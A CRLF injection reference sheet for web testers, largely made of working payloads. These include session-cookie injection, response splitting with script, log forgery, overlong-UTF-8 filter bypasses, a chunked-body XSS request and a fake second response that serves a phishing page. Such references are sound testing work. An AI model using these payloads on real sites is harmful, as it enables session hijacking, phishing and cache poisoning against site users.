# CRLF Injection

## Overview
Carriage Return Line Feed (\r\n) injection into HTTP headers to split responses, inject headers, or achieve XSS via header-based injection.

## CRLF Characters
```
\r\n = %0d%0a = CR + LF
\n = %0a = LF only (often sufficient)
\r = %0d
```

## Header Injection
```
# Inject into URL parameter reflected in Location/Set-Cookie
GET /redirect?url=https://target.com%0d%0aSet-Cookie:session=hijacked

# Inject new headers
GET /page?lang=en%0d%0aX-Injected:value%0d%0a

# Inject into existing header value
GET /page
Host: target.com%0d%0aX-Forwarded-For:127.0.0.1
```

## HTTP Response Splitting
```
# Inject \r\n\r\n to split response body
GET /redirect?url=https://evil.com%0d%0a%0d%0a<html><script>alert(1)</script>

# Full response splitting:
%0d%0aContent-Type:text/html%0d%0a%0d%0a<script>alert(document.domain)</script>

# In Location header:
Location: https://target.com%0d%0aContent-Type:text/html%0d%0a%0d%0a<h1>Hacked</h1>
```

## XSS via CRLF
```
# Inject script via Set-Cookie
GET /set-lang?lang=en%0d%0aSet-Cookie:lang=<script>alert(1)</script>

# Header injection leading to XSS
%0d%0aContent-Type:%20text/html%0d%0aX-XSS-Protection:%200%0d%0a%0d%0a<script>alert(1)</script>
```

## Log Injection
```
# Inject into log-destined parameters
username=admin%0aINFO: Login successful for admin
# Creates false log entry
```

## Common Injection Points
```
# Redirect URLs
/redirect?to=https://target.com
/login?next=/dashboard

# Language/locale parameters
?lang=en
?locale=en-US

# Callback URLs
?callback=https://target.com/cb

# Any parameter reflected in headers (Location, Set-Cookie, etc.)
```

## Encoding Variations
```
%0d%0a   → \r\n (standard)
%0a      → \n (LF only — may work)
%0d      → \r
%E5%98%8A%E5%98%8D  → Unicode CRLF (\u560a\u560d)
\r\n     → literal (in some contexts)
\n       → literal
```

## Testing Methodology
1. Find parameters reflected in response headers
2. Test with %0d%0a followed by a new header
3. Check response for injected header
4. Test %0a alone if %0d%0a is filtered
5. Try Unicode variants
6. Attempt response splitting (inject double CRLF + body)
7. Test log injection if input goes to logs

## Vulnerable Contexts
- Redirect parameters (Location header)
- Cookie setting endpoints
- Language/locale selection
- User profile fields reflected in headers
- API responses setting headers from user input

## Impact
- XSS via response body injection
- Session fixation via Set-Cookie injection
- Cache poisoning via injected Cache-Control
- Log forgery
- Header injection for downstream processing abuse


## Additional Techniques — ported from WebSkills (crlf-test)

### Overlong-UTF-8 Filter Bypass (full map)

When `%0d`/`%0a` are filtered, some parsers still decode overlong/UTF-8 sequences into the CR/LF and `<`/`>` characters. Full mapping:

```
%E5%98%8A → %0A → 嘊   (LF)
%E5%98%8D → %0D → 嘍   (CR)
%E5%98%BC → %3C → 嘼   (<)
%E5%98%BE → %3E → 嘾   (>)
```

Example payload (injects a full header set + reflected XSS past a filter):

```
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert%28innerHTML%28%29%E5%98%BE
```

### CRLF → XSS via chunked body + X-XSS-Protection:0

Instead of relying on response splitting alone, inject a `Content-Length` + `X-XSS-Protection:0` then a chunked body so the browser renders your markup. Chunk size (`23`) precedes the payload, `0` terminates:

```
http://example.com/%0d%0aContent-Length:35%0d%0aX-XSS-Protection:0%0d%0a%0d%0a23%0d%0a<svg%20onload=alert(document.domain)>%0d%0a0%0d%0a/%2f%2e%2e
```

Response:
```http
HTTP/1.1 200 OK
Content-Length: 35
X-XSS-Protection: 0

23
<svg onload=alert(document.domain)>
0
```

### Full response-write for phishing (fake Content-Length:0)

Terminate the original response with a fake `Content-Length: 0`, then write an entirely attacker-controlled second response the browser treats as the page:

```
/index.php?lang=en%0D%0AContent-Length%3A%200%0A%20%0AHTTP/1.1%20200%20OK%0AContent-Type%3A%20text/html%0AContent-Length%3A%2034%0A%20%0A%3Chtml%3EYou%20have%20been%20Phished%3C/html%3E
```
